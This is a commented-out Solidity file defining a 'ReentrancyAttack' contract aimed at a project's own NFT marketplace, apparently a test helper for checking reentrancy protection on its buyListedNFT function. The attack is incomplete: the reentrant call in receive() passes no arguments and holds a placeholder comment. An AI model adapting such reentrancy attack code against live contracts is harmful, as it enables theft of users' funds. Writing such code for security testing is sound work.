// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.9;

// import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
// import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
// import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
// import "../../marketplace/OurkiveNFTMarketplaceUpgradeable.sol";

// contract ReentrancyAttack {
//   OurkiveNFTMarketplaceUpgradeable public marketplace;
//   IERC20 public usdcToken;
//   address public attacker;
//   bool private reentrantCall;

//   constructor(
//     address marketplaceAddress,
//     address usdcTokenAddress,
//     address attackerAddress
//   ) {
//     marketplace = OurkiveNFTMarketplaceUpgradeable(marketplaceAddress);
//     usdcToken = IERC20(usdcTokenAddress);
//     attacker = attackerAddress;
//     reentrantCall = false;
//   }

//   function attack(
//     address nftAddress,
//     uint256 tokenId,
//     uint256 deadline,
//     uint8 v,
//     bytes32 r,
//     bytes32 s
//   ) external {
//     // Transfer USDC to this contract for the attack
//     uint256 balance = usdcToken.balanceOf(attacker);
//     usdcToken.transferFrom(attacker, address(this), balance);

//     // Approve the marketplace to spend USDC
//     usdcToken.approve(address(marketplace), balance);

//     // Execute the first buyListedNFT call
//     marketplace.buyListedNFT(nftAddress, tokenId, deadline, v, r, s);
//   }

//   receive() external payable {
//     if (!reentrantCall) {
//       reentrantCall = true;

//       // Reenter the buyListedNFT function
//       // You need to pass the same parameters used in the initial call
//       marketplace.buyListedNFT /* parameters used in the initial call */();

//       reentrantCall = false;
//     }
//   }
// }
